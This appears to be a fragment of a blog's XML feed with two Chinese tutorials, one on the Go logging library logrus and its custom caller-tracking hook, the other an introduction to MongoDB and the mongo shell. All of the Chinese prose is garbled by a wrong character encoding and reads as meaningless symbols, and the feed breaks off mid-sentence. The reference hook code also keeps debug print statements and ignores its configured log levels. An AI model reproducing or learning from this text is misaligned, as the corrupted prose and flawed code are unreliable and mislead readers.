å¯ä»¥é€šè¿‡æ’ä»¶å°†ä½ çš„æ—¥å¿—å‘å¾€ä»»æ„åœ°æ–¹, æ¯”å¦‚æ–‡ä»¶, æ ‡å‡†è¾“å‡º, logstash, influxdb, â€¦ã€‚è¿™æ­£å¼å®ƒæœ€å¸å¼•äººçš„åœ°æ–¹ã€‚ ä½¿ç”¨logrusæœ‰6ä¸ªæ—¥å¿—ç­‰çº§, åˆ†åˆ«ä¸º: Debug,Info,Warn,Error,Fatal,Panic, ç»è¿‡ç®€å•çš„é…ç½®å°±å¯ä»¥ä½¿ç”¨äº†ã€‚logrusæœ‰2ç§formater, åˆ†åˆ«æ˜¯: JSONFormatter, TextFormatter, å½“ç„¶å¦‚æœä½ è§‰å¾—éƒ½ä¸æ˜¯ä½ æƒ³è¦çš„, å¯ä»¥é€šè¿‡å®ç°Formatteræ¥å£å®šåˆ¶è‡ªå·±çš„formater åŸºç¡€ä½¿ç”¨å½“åˆå§‹åŒ–å¥½logruså, å¯ä»¥ç›´æ¥è°ƒç”¨Debugç­‰è¿›è¡Œæ—¥å¿—è®°å½•ã€‚WithFieldsæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„åŠŸèƒ½, å®ƒç”¨äºè®°å½•ä½ è¿™æ¡messageçš„ä¸€äº›å…ƒæ•°æ®ä¿¡æ¯, æ¯”å¦‚ä½ å¯ä»¥è®°å½•æ˜¯æœ‰é‚£ä¸ªè®¿é—®è§¦å‘çš„(request_id) 123456789101112131415161718192021package mainimport ( "os" "github.com/sirupsen/logrus")func main() &#123; logrus.WithFields(logrus.Fields&#123;"animal": "walrus","size": 10&#125;).Info("A group of walrus emerges from the ocean") logrus.WithFields(logrus.Fields&#123;"request_id": "requestA"&#125;).Warn("The group's number increased tremendously!") logrus.WithFields(logrus.Fields&#123;"request_id": "requestB"&#125;).Fatal("The ice breaks!")&#125;func init() &#123; // ä»¥JSONæ ¼å¼ä¸ºè¾“å‡ºï¼Œä»£æ›¿é»˜è®¤çš„ASCIIæ ¼å¼ logrus.SetFormatter(&amp;logrus.JSONFormatter&#123;&#125;) // ä»¥Stdoutä¸ºè¾“å‡ºï¼Œä»£æ›¿é»˜è®¤çš„stderr logrus.SetOutput(os.Stdout) // è®¾ç½®æ—¥å¿—ç­‰çº§ logrus.SetLevel(logrus.WarnLevel)&#125; ä½¿ç”¨Loggerloggeræ˜¯ä¸€ç§ç›¸å¯¹é«˜çº§çš„ç”¨æ³•, å¯¹äºä¸€ä¸ªå¤§å‹é¡¹ç›®, å¾€å¾€éœ€è¦ä¸€ä¸ªå…¨å±€çš„loggerå¯¹è±¡, ç”¨äºè®°å½•é¡¹ç›®æ‰€æœ‰çš„æ—¥å¿— 1234567logger := logrus.New()logger.Formatter = &amp;logrus.JSONFormatter&#123;&#125;// Use logrus for standard log output// Note that `log` here references stdlib's log// Not logrus imported under the name `log`.log.SetOutput(logger.Writer()) Hookå®˜æ–¹æœ‰å¾ˆå¤šç°æˆçš„Hook, å¯ä»¥å®ç° è®°å½•æ—¥å¿—åˆ°æ–‡ä»¶(æ—¥å¿—æ–‡ä»¶è½®è½¬), è®°å½•åˆ°kafka, è®°å½•åˆ°influxDB, è®°å½•åˆ°MySQLâ€¦ 1234567891011121314151617181920import ( log "github.com/sirupsen/logrus" "gopkg.in/gemnasium/logrus-airbrake-hook.v2" // the package is named "aibrake" logrus_syslog "github.com/sirupsen/logrus/hooks/syslog" "log/syslog")func init() &#123; // Use the Airbrake hook to report errors that have Error severity or above to // an exception tracker. You can create custom hooks, see the Hooks section. log.AddHook(airbrake.NewHook(123, "xyz", "production")) hook, err := logrus_syslog.NewSyslogHook("udp", "localhost:514", syslog.LOG_INFO, "") if err != nil &#123; log.Error("Unable to connect to local syslog daemon") &#125; else &#123; log.AddHook(hook) &#125;&#125; é—®é¢˜ä¸‹é¢è¿™ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬é‡åˆ°çš„æœ€éƒé—·çš„é—®é¢˜, å› ä¸ºå°±è¿æ ‡å‡†åº“éƒ½å·²ç»å®ç°çš„åŠŸèƒ½,æ²¡æƒ³åˆ°logrusä¼šä¸æä¾›ã€‚ ä¸è®°å½•æ–‡ä»¶åå’Œè¡Œå·ä½¿ç”¨logrusæœ‰ä¸€ä¸ªå¾ˆè¦å‘½çš„é—®é¢˜: ä¸ä¼šè®°å½•æ—¥å¿—æ‰“å°çš„è¡Œå·å’Œæ–‡ä»¶å, è¿™åœ¨æ’é”™æ—¶ä¼šæ˜¾å¾—å¾ˆä¸æ–¹ä¾¿, è€Œgithubä¸Šå…³äºlog filename and line numberçš„issueå·²ç»æŒ‚äº†3å¹´äº†, å¤§å®¶è§£å†³çš„åŠæ³•å¤§è‡´ä¸º2ç±»: è‡ªå·±å†™hookæ¥è®°å½• 1234567891011121314151617181920212223type ContextHook struct &#123;&#125;func (hook ContextHook) Levels() []log.Level &#123; return log.AllLevels&#125;func (hook ContextHook) Fire(entry *log.Entry) error &#123; if pc, file, line, ok := runtime.Caller(8); ok &#123; funcName := runtime.FuncForPC(pc).Name() entry.Data["file"] = path.Base(file) entry.Data["func"] = path.Base(funcName) entry.Data["line"] = line &#125; return nil&#125;func main() &#123; log.AddHook(ContextHook&#123;&#125;) â€¦&#125; é€šè¿‡è£…é¥°å™¨æ¨¡å¼æ¥åŒ…è£…ä¸€å±‚ 123456789101112131415161718192021222324252627282930313233343536373839package loggerimport ( "fmt" "net/http" "runtime" "strings" "github.com/Sirupsen/logrus")/* truncated */// Decorate appends line, file and function context to the logger and returns a function to call before// each logfunc Decorate(logger *logrus.Entry) func() *logrus.Entry &#123; return func() *logrus.Entry &#123; if pc, f, line, ok := runtime.Caller(1); ok &#123; fnName := runtime.FuncForPC(pc).Name() file := strings.Split(f, "mobilebid")[1] caller := fmt.Sprintf("%s:%v %s", file, line, fnName) return logrus.WithField("caller", caller) &#125; return logger &#125;&#125;// Log appends line, file and function context to the loggerfunc Log() *logrus.Entry &#123; if pc, f, line, ok := runtime.Caller(1); ok &#123; fnName := runtime.FuncForPC(pc).Name() file := strings.Split(f, "mobilebid")[1] caller := fmt.Sprintf("%s:%v %s", file, line, fnName) return logrus.WithField("caller", caller) &#125; return &amp;logrus.Entry&#123;&#125;&#125; ä¸ªäººåå‘äºè‡ªå·±å®ç°ä¸€ä¸ªhookçš„å¤„ç†æ–¹å¼, è¿™ä¹Ÿæ˜¯ä½œè€…æ¯”è¾ƒè®¤å¯çš„ä¸€ç§æ–¹å¼, ä½œè€…åŸè¯æ˜¯è¿™æ ·è¯´çš„Yes, unless someone can prove a negligible performance impact I think this should be a hook., å› æ­¤æˆ‘æµ‹è¯•äº†ä¸Šé¢é‚£æ®µè‡ªå·±å®ç°ContextHookçš„ä»£ç , å¾ˆé—æ†¾, å±…ç„¶æ²¡æˆåŠŸ, å› æ­¤ä¸å¾—ä¸è‡ªå·±å†™ä¸€ä¸ªContextHook, é¡ºä¾¿äº†è§£ä¸‹è·å–filenameå’Œline numberçš„åŸç†ã€‚ è·å–æ–‡ä»¶åå’Œè¡Œå·çš„åŸç†åœ¨runtimeé‡Œé¢æœ‰ä¸€ä¸ªcallerå‡½æ•°, æºç é‡Œé¢æ˜¯è¿™æ ·æè¿°callerçš„:12345Caller reports file and line number information about function invocations on the calling goroutine&apos;s stack. The argument skip is the number of stack frames to ascend, with 0 identifying the caller of Caller. (For historical reasons the meaning of skip differs between Caller and Callers.) The return values report the program counter, file name, and line number within the file of the corresponding call. The boolean ok is false if it was not possible to recover the information. ç®€è€Œè¨€ä¹‹, æˆ‘ä»¬é€šè¿‡callerå¯ä»¥è¿½è¸ªæ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨çš„æ–‡ä»¶å’Œè¡Œå·ä¿¡æ¯, ä½†æ˜¯æˆ‘ä»¬çš„å‡½æ•°è°ƒç”¨é“¾å¾€å¾€æœ‰æ·±, è€Œæˆ‘ä»¬éœ€è¦çš„ä»…ä»…æ˜¯è®°å½•æ—¥å¿—æ—¶çš„é‚£ä¸€å±‚çš„å‡½æ•°è°ƒç”¨ä¿¡æ¯ã€‚å¦‚ä½•æ‰¾åˆ°è¿™ä¸€å±‚å–ƒ?æˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸€å±‚éƒ½æ‰“å°å‡ºæ¥, çœ‹çœ‹æœ‰å•¥è§„å¾‹:123456789101112131415161718/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 134/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 181/Users/maojun/GoWorkDir/src/openauth/cmd/openauth/cmd/service.go: 55.../Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 134/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 182/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 118/Users/maojun/GoWorkDir/src/openauth/api/http/handler/init.go: 42.../Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 144/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 189/Users/maojun/GoWorkDir/src/openauth/api/http/server.go: 71... æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå‰é¢å‡ æ¬¡è°ƒç”¨é“¾, éƒ½è¢«logrusè‡ªå·±ä½¿ç”¨äº†, å› æ­¤æˆ‘ä»¬ä»…éœ€è¦é™¤å»logrusè°ƒç”¨é“¾çš„å‡½æ•°, ç„¶åç¬¬ä¸€ä¸ªè¢«æ‰¾åˆ°çš„å°±æ˜¯æˆ‘ä»¬è®°å½•æ—¥å¿—çš„è°ƒç”¨äº†, æ¯”å¦‚æœ€åä¸€ä¸ª: http/server.go: 71, æˆ‘åœ¨è¿™é‡Œè°ƒç”¨logrus: logger.Debug(â€œmsgâ€) é‚£ä¹ˆlogrusçš„è°ƒç”¨é“¾æœ€å¤šæœ‰å‡ å±‚å–ƒï¼Ÿæˆ‘ä»¬æ‰§è¡Œå¤šå°‘æ¬¡é€’å½’æ‰èƒ½æ‰¾åˆ°æˆ‘ä»¬è‡ªå·±çš„debug callï¼Ÿ12cmd/service.go: 55 [logger.Debug()] ---&gt; logrus/logger.go: 181 [entry.Debug()] ---&gt; logrus/entry.go: 134 [entry.log()] ---&gt; logrus/entry.go: 98 [entry.Logger.Hooks.Fire()]handler/init.go: 42 [logger.Debugf()] ---&gt; logrus/logger.go: 118 [entry.Debug()] ---&gt; logrus/entry.go: 182 [logger.releaseEntry()] ---&gt; logrus/entry.go: 134 [entry.log()] ---&gt; logrus/entry.go: 98 [entry.Logger.Hooks.Fire()] ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå½“æˆ‘ä»¬ä½¿ç”¨(Debug, Debugf, Debugln), åº•å±‚è°ƒç”¨é“¾çš„é•¿åº¦å¤§è‡´ä¸º3~4å±‚, å› æ­¤æˆ‘ä»¬æœ€å°‘éœ€è¦é€’å½’5æ¬¡æ‰èƒ½æ‰¾åˆ°æˆ‘ä»¬è‡ªå·±çš„debug call. æœ€åæ‰¾åˆ°äº†è®°å½•ä¸‹æ¥å°±okäº†ã€‚ è‡ªå·±å®ç°ä¸€ä¸ªContextHookå¦‚ä½•å®ç°ä¸€ä¸ªlogrusçš„hookå–ƒ?123456789// A hook to be fired when logging on the logging levels returned from// `Levels()` on your implementation of the interface. Note that this is not// fired in a goroutine or a channel with workers, you should handle such// functionality yourself if your call is non-blocking and you don't wish for// the logging calls for levels returned from `Levels()` to block.type Hook interface &#123; Levels() []Level Fire(*Entry) error&#125; ä¸€ä¸ªEntryä¸ºä¸€æ¡æ—¥å¿—è®°å½•, æˆ‘ä»¬çš„Hookéœ€è¦åšçš„å°±æ˜¯åœ¨æ¯ä¸€ä¸ªæ¡çš„æ—¥å¿—è®°å½•é‡Œé¢æ·»åŠ è°ƒç”¨æ—¶çš„æ–‡ä»¶åå’Œè¡Œå·. æ ¸å¿ƒå°±æ˜¯å®ç°è‡ªå·±çš„Fireæ–¹æ³•, ä»¥ä¸‹æ˜¯å‚è€ƒå®ç°:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package hooksimport ( "fmt" "runtime" "strings" "github.com/sirupsen/logrus")// ContextHook for log the call contexttype contextHook struct &#123; Field string Skip int levels []logrus.Level&#125;// NewContextHook use to make an hook// æ ¹æ®ä¸Šé¢çš„æ¨æ–­, æˆ‘ä»¬é€’å½’æ·±åº¦å¯ä»¥è®¾ç½®åˆ°5å³å¯.func NewContextHook(levels ...logrus.Level) logrus.Hook &#123; hook := contextHook&#123; Field: "source", Skip: 5, levels: levels, &#125; if len(hook.levels) == 0 &#123; hook.levels = logrus.AllLevels &#125; return &amp;hook&#125;// Levels implement levelsfunc (hook contextHook) Levels() []logrus.Level &#123; return logrus.AllLevels&#125;// Fire implement firefunc (hook contextHook) Fire(entry *logrus.Entry) error &#123; entry.Data[hook.Field] = findCaller(hook.Skip) return nil&#125;// å¯¹callerè¿›è¡Œé€’å½’æŸ¥è¯¢, ç›´åˆ°æ‰¾åˆ°élogrusåŒ…äº§ç”Ÿçš„ç¬¬ä¸€ä¸ªè°ƒç”¨.// å› ä¸ºfilenameæˆ‘è·å–åˆ°äº†ä¸Šå±‚ç›®å½•å, å› æ­¤æ‰€æœ‰logrusåŒ…çš„è°ƒç”¨çš„æ–‡ä»¶åéƒ½æ˜¯ logrus/...// å› æ­¤é€šè¿‡æ’é™¤logruså¼€å¤´çš„æ–‡ä»¶å, å°±å¯ä»¥æ’é™¤æ‰€æœ‰logrusåŒ…çš„è‡ªå·±çš„å‡½æ•°è°ƒç”¨func findCaller(skip int) string &#123; file := "" line := 0 for i := 0; i &lt; 10; i++ &#123; file, line = getCaller(skip + i) if !strings.HasPrefix(file, "logrus") &#123; break &#125; &#125; return fmt.Sprintf("%s:%d", file, line)&#125;// è¿™é‡Œå…¶å®å¯ä»¥è·å–å‡½æ•°åç§°çš„: fnName := runtime.FuncForPC(pc).Name()// ä½†æ˜¯æˆ‘è§‰å¾—æœ‰ æ–‡ä»¶åå’Œè¡Œå·å°±å¤Ÿå®šä½é—®é¢˜, å› æ­¤å¿½ç•¥äº†callerè¿”å›çš„ç¬¬ä¸€ä¸ªå€¼:pc// åœ¨æ ‡å‡†åº“logé‡Œé¢æˆ‘ä»¬å¯ä»¥é€‰æ‹©è®°å½•æ–‡ä»¶çš„å…¨è·¯å¾„æˆ–è€…æ–‡ä»¶å, ä½†æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹æˆå¹¶å‘æœ€åˆé€‚çš„,// å› ä¸ºæ–‡ä»¶çš„å…¨è·¯å¾„å¾€å¾€å¾ˆé•¿, è€Œæ–‡ä»¶ååœ¨å¤šä¸ªåŒ…ä¸­å¾€å¾€æœ‰é‡å¤, å› æ­¤è¿™é‡Œé€‰æ‹©å¤šå–ä¸€å±‚, å–åˆ°æ–‡ä»¶æ‰€åœ¨çš„ä¸Šå±‚ç›®å½•é‚£å±‚.func getCaller(skip int) (string, int) &#123; _, file, line, ok := runtime.Caller(skip) fmt.Println(file) fmt.Println(line) if !ok &#123; return "", 0 &#125; n := 0 for i := len(file) - 1; i &gt; 0; i-- &#123; if file[i] == '/' &#123; n++ if n &gt;= 2 &#123; file = file[i+1:] break &#125; &#125; &#125; return file, line&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDBä»‹ç»ä¸Golangé©±åŠ¨ä½¿ç”¨]]></title>
    <url>%2F2017%2F11%2F22%2Fgolang-mongodb%2F</url>
    <content type="text"><![CDATA[åœ¨ä¸Šç¯‡åšå®¢ä¸­ä»‹ç»äº†NoSQLä»¥åŠæ–‡æ¡£æ•°æ®åº“, è¿™ç¯‡åšå®¢ä»‹ç»å½“ä¸‹æœ€æµè¡Œçš„æ–‡æ¡£æ•°æ®åº“:MongoDBã€‚ MongoDBç®€ä»‹mongodbæ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„æ•°æ®åº“ã€‚ç”±C++è¯­è¨€ç¼–å†™ã€‚æ—¨åœ¨ä¸ºWEBåº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚å®ƒæ˜¯ä¸€ä¸ªä»‹äºå…³ç³»æ•°æ®åº“å’Œéå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚ mongodbè¢«å„ç§è§„æ¨¡çš„å…¬å¸ã€å„ä¸ªè¡Œä¸šã€ä»¥åŠå„ç§åº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨, å®ƒæ˜¯çµæ´»çš„æ•°æ®åº“, éšç€åº”ç”¨ç¨‹åºçš„å‘å±•, mongodbèƒ½é€‚åº”ç¨‹åºschemaçš„å¿«é€Ÿæ”¹å˜(schema free), åŒæ—¶è¿˜æä¾›å¼€å‘äººå‘˜æ‰€æœŸæœ›çš„ä¼ ç»Ÿæ•°æ®åº“çš„åŠŸèƒ½ï¼Œæ¯”å¦‚äºŒçº§ç´¢å¼•ï¼Œå®Œæ•´çš„æŸ¥è¯¢è¯­è¨€å’Œä¸¥æ ¼çš„ä¸€è‡´æ€§ã€‚ mongodbæœ‰ç€ä¸€ä¸ªä¸°å¯Œçš„å®¢æˆ·ç«¯ç”Ÿæ€ç³»ç»Ÿ, åŒ…æ‹¬hadoopçš„é›†æˆ, å®˜æ–¹æä¾›10å¤šç§ç¼–ç¨‹è¯­è¨€çš„é©±åŠ¨, è€Œç”¨æˆ·ç¤¾åŒºæä¾›é«˜è¾¾40å¤šç§çš„é©±åŠ¨, åé¢ä¼šä¸“é—¨ä»‹ç»Golangçš„MongoDBé©±åŠ¨mgoçš„ä½¿ç”¨ã€‚ mongodbçš„æµè¡Œç¦»ä¸å¼€ä»–çš„è¿™äº›ä¼˜ç‚¹: json: é¢å‘jsonçš„æ–‡æ¡£å­˜å‚¨ï¼Œæ“ä½œèµ·æ¥æ¯”è¾ƒç®€å•å’Œå®¹æ˜“, åº•å±‚å­˜å‚¨ä¸ºBson(äºŒè¿›åˆ¶çš„json) schema free: ç‰¹åˆ«é€‚åˆå­˜å‚¨åŠç»“æ„åŒ–çš„æ•°æ®ã€‚ performance: c++ç¼–å†™, æ”¯æŒå…¨æ–‡ç´¢å¼•, åŸºäºå†…å­˜æ˜ å°„æŠ€æœ¯(Memory-mapped files) scalable: Replication, Auto-sharding query: æ”¯æŒä¸°å¯Œçš„æŸ¥è¯¢è¡¨è¾¾å¼ã€‚æŸ¥è¯¢æŒ‡ä»¤ä½¿ç”¨JSONå½¢å¼çš„æ ‡è®°ï¼Œå¯è½»æ˜“æŸ¥è¯¢æ–‡æ¡£ä¸­å†…åµŒçš„å¯¹è±¡åŠæ•°ç»„, å¹¶ä¸”å¾ˆé«˜æ•ˆ(queries run in parallel on all shards) map/reduce: Mapå‡½æ•°å’ŒReduceå‡½æ•°æ˜¯ä½¿ç”¨Javascriptç¼–å†™çš„, å¹¶å¯ä»¥é€šè¿‡db.runCommandæˆ–mapreduceå‘½ä»¤æ¥æ‰§è¡ŒMapReduceæ“ä½œã€‚ udf: å¯ä»¥ç”¨Javascriptç¼–å†™æŸä¸ªå‡½æ•°ï¼Œç›´æ¥åœ¨æœåŠ¡ç«¯æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æŠŠå‡½æ•°çš„å®šä¹‰å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼Œä¸‹æ¬¡ç›´æ¥è°ƒç”¨å³å¯ã€‚ file storage: GridFSæ˜¯MongoDBä¸­çš„ä¸€ä¸ªå†…ç½®åŠŸèƒ½ï¼Œå¯ä»¥ç”¨äºå­˜æ”¾å¤§é‡å°æ–‡ä»¶ã€‚ suport many language: æ”¯æŒå„ç§ç¼–ç¨‹è¯­è¨€:RUBYï¼ŒPYTHONï¼ŒJAVAï¼ŒC++ï¼ŒPHPï¼ŒC#ç­‰å¤šç§è¯­è¨€ã€‚ opensource: å¼€æºä½†æ˜¯èƒŒåæœ‰å•†ä¸šå…¬å¸æ”¯æŒ(10gen), å½“ç„¶ä¹Ÿæœ‰ä¼ä¸šç‰ˆã€‚ docs: å®Œå–„çš„æ–‡æ¡£, æ— è®ºæ˜¯æ¶æ„, å®‰è£…, ä½¿ç”¨è¿˜æ˜¯å…¶ä»–, å®˜æ–¹æä¾›å®Œå–„çš„æ–‡æ¡£æ”¯æŒã€‚å¹¶ä¸”å®‰è£…ç®€å•ã€‚ å› ä¸ºmongoæ–‡æ¡£å¾ˆå®Œå–„, å› æ­¤å®‰è£…è¯·çœ‹mongod unbuntu å®‰è£…æ–‡æ¡£ã€‚å½“å‰ç¨³å®šç‰ˆä¸º3.4, åé¢çš„æµ‹è¯•éƒ½æ˜¯åŸºäº3.4ç‰ˆæœ¬è¿›è¡Œè¯´æ˜çš„ã€‚ä¸ºäº†æ–¹ä¾¿æˆ‘ä½¿ç”¨dockerè¿›è¡Œå®‰è£…:1234567891011121314151617181920maojun@maojun-mbp $ docker pull mongo:3.4# å¦‚æœä½ éœ€è¦æŠŠæ•°æ®æ–‡ä»¶æŒ‚è½½å‡ºå», é˜²æ­¢ä¸¢å¤±å¯ä»¥:# docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.4# ä½†æ˜¯æˆ‘æœ¬èº«å°±æ˜¯æµ‹è¯•ç¯å¢ƒ, å®¹å™¨åˆ äº†å°±è®©ä»–åˆ äº†å§:docker run -p 27017:27017 -d mongo:3.419ceeb4814632f089a0a78bb98af83d9fb49cb377aae2534d67881851bf6644e# è¿›å…¥å®¹å™¨æµ‹è¯•ä¸‹mongo shellæ˜¯å¦æ­£å¸¸:maojun@maojun-mbp $ docker exec -it 19c /bin/bashroot@19ceeb481463:/# mongoMongoDB shell version v3.4.10connecting to: mongodb://127.0.0.1:27017MongoDB server version: 3.4.10Welcome to the MongoDB shell.For interactive help, type "help".For more comprehensive documentation, see http://docs.mongodb.org/Questions? Try the support group http://groups.google.com/group/mongodb-user&gt; dbtest åŸºç¡€æ¦‚å¿µè§£æä¸ç®¡æˆ‘ä»¬å­¦ä¹ ä»€ä¹ˆæ•°æ®åº“éƒ½åº”è¯¥å­¦ä¹ å…¶ä¸­çš„åŸºç¡€æ¦‚å¿µ, åœ¨mongodbä¸­åŸºæœ¬çš„æ¦‚å¿µæ˜¯æ–‡æ¡£ã€é›†åˆã€æ•°æ®åº“, å¦‚æœå¯¹æ¯”ä¼ ç»Ÿæ•°æ®åº“çš„è¡¨, é‚£ä¹ˆä¸‹é¢è¿™å¼ å›¾å¯ä»¥å¸®ç»„æˆ‘ä»¬å¿«é€Ÿç†è§£MongoDBé‡Œé¢è¿™äº›åŸºæœ¬æ¦‚å¿µ: æ•°æ®åº“(DB)å¯¹åº”äºä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“, DBå°±æ˜¯è¡¨çš„é›†åˆ, è€ŒMongoé‡Œé¢DBæ˜¯Collectionsçš„é›†åˆã€‚ä½†æ˜¯å¯¹äºä¼ ç»Ÿçš„å…³ç³»æ•°æ®åº“è€Œè¨€, åœ¨ä½¿ç”¨ä¸Šæœ‰ç•¥å¾®çš„åŒºåˆ«: åŠ¨æ€åˆ›å»º: mongodbçš„dbä¸ç”¨å•ç‹¬åˆ›å»º, å¦‚æœä½¿ç”¨æ—¶æ²¡æœ‰å°±ä¼šè¢«è‡ªåŠ¨åˆ›å»ºã€‚ ä½¿ç”¨æ–¹å¼: é€šè¿‡ show dbsæŸ¥çœ‹æ•°æ®åº“, é€šè¿‡ use dbNameåˆ‡æ¢æ•°æ®åº“, é€šè¿‡dbæŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“, é€šè¿‡show collectionsæŸ¥çœ‹æ‰€æœ‰çš„é›†åˆ(è¡¨) 1234567891011121314&gt; show dbsadmin 0.078GBgateway 0.078GBlocal 0.078GB&gt;&gt; use gatewayswitched to db gateway&gt;&gt; show collections;students&gt;&gt; dbgateway&gt; æ–‡æ¡£(Document)æ–‡æ¡£æ˜¯MongoDBé‡Œé¢æœ€é‡è¦çš„æ¦‚å¿µ, ä½ å¯ä»¥å°†å®ƒç†è§£ä¸ºå…³ç³»å‹æ•°æ®çš„ä¸­Row,ä¸€ä¸ªæ–‡æ¡£ç›¸å½“äºmysqlä¸­çš„ä¸€è¡Œ, æ–‡æ¡£ç»„ç»‡çš„æ ¼å¼æ˜¯Jsoné£æ ¼, å¦‚ä¸‹: ä½†æ˜¯mongodbå¹¶ä¸ä¼šå­˜å‚¨çš„Json, è€Œæ˜¯å­˜å‚¨çš„Bson(Jsonçš„äºŒè¿›åˆ¶æ ¼å¼), å½“æˆ‘ä»¬æŸ¥çœ‹æ—¶Bsonä¼šè‡ªåŠ¨è½¬æ¢æˆJson, ä¸ºäº†è¿½è¸ªæ¯ä¸€ä¸ª Document, æ¯ä¸€ä¸ªDocumentéƒ½æœ‰ä¸€ä¸ªéšè—çš„id å­—æ®µï¼Œ è¿™å°±å¥½åƒmyslqçš„row_id, å®ƒæ˜¯Mongodbé‡Œé¢çš„ä¸»é”®ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå…·ä½“çš„æ —å­:12&gt; db.students.find()&#123; "_id" : ObjectId("5a162b109d83b8def7401002"), "name" : "Bob", "age" : 22 &#125; é›†åˆ(Collection)documentçš„å®¹å™¨, ä¸€ç»„ç›¸å…³çš„documentç»„æˆçš„ä¸€ä¸ªé›†åˆå°±å«collection, å› æ­¤collectionç›¸å½“äºmysqlä¸­çš„table, å¦‚ä¸‹: é›†åˆå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œé›†åˆæ²¡æœ‰å›ºå®šçš„ç»“æ„(æ–‡æ¡£ä¸éœ€è¦è®¾ç½®ç›¸åŒçš„å­—æ®µï¼Œå¹¶ä¸”ç›¸åŒçš„å­—æ®µä¸éœ€è¦ç›¸åŒçš„æ•°æ®ç±»å‹)ï¼Œè¿™æ„å‘³ç€ä½ åœ¨å¯¹é›†åˆå¯ä»¥æ’å…¥ä¸åŒæ ¼å¼å’Œç±»å‹çš„æ•°æ®ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ’å…¥é›†åˆçš„æ•°æ®éƒ½ä¼šæœ‰ä¸€å®šçš„å…³è”æ€§ã€‚è¿™ä¸å…³ç³»å‹æ•°æ®åº“æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œä¹Ÿæ˜¯MongoDBéå¸¸çªå‡ºçš„ç‰¹ç‚¹, è¯¥ç‰¹æ€§è¢«ç§°ä½œschema freeã€‚ æ¯”å¦‚:1234&gt; db.students.find()&#123; "_id" : ObjectId("5a162b109d83b8def7401002"), "name" : "Bob", "age" : 22 &#125;&#123; "_id" : ObjectId("5a162b829d83b8def7401003"), "name" : "Bob", "money" : 99 &#125;&#123; "_id" : ObjectId("5a162bbd9d83b8def7401004"), "name" : "Bob", "location" : "chengdu" &#125; mongo shellçš„ä½¿ç”¨æ­£å¸¸å®‰è£…å®ŒMongoDBè¿‡åä¼šå®‰è£…mongodb-org-shellåŒ…, å®ƒæ˜¯mongoDBçš„å®¢æˆ·ç«¯å·¥å…·, æˆ‘ä»¬ä½¿ç”¨å®ƒå’ŒMongoDBè¿›è¡Œäº¤äº’(å°±åƒMySQLçš„å®¢æˆ·ç«¯å·¥å…·ä¸€æ ·).é€šè¿‡helpæŸ¥çœ‹mongo-shellçš„ä½¿ç”¨æ–¹æ³•:123456789101112131415161718192021222324&gt; help db.help() help on db methods db.mycoll.help() help on collection methods sh.help() sharding helpers rs.help() replica set helpers help admin administrative help help connect connecting to a db help help keys key shortcuts help misc misc things to know help mr mapreduce show dbs show database names show collections show collections in current database show users show users in current database show profile show most recent system.profile entries with time &gt;= 1ms show logs show the accessible logger names show log [name] prints out the last segment of log in memory, 'global' is default use &lt;db_name&gt; set current database db.foo.find() list objects in collection foo db.foo.find( &#123; a : 1 &#125; ) list objects in foo where a == 1 it result of the last line evaluated; use to further iterate DBQuery.shellBatchSize = x set default number of items to display on shell exit quit the mongo shell&gt; ä¸‹é¢å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨mongoå®¢æˆ·ç«¯å¯¹æ•°æ®è¿›è¡ŒåŸºæœ¬çš„å¢åˆ æ”¹æŸ¥ æ·»åŠ æ•°æ®è¯­æ³•: db.mycoll.insert(document)ç”¨æ³•: åœ¨insertå‡½æ•°å†…ä¼ å…¥ä½ éœ€è¦è®°å½•çš„jsonã€‚12&gt; db.students.insert(&#123;"name": "Bob", "age": 22&#125;)WriteResult(&#123; "nInserted" : 1 &#125;) æŸ¥çœ‹æ•°æ®è¯­æ³•: db.mycoll.find(query, projection)å‚æ•°: query: å¯é€‰ï¼Œä½¿ç”¨æŸ¥è¯¢æ“ä½œç¬¦æŒ‡å®šæŸ¥è¯¢æ¡ä»¶ projection: 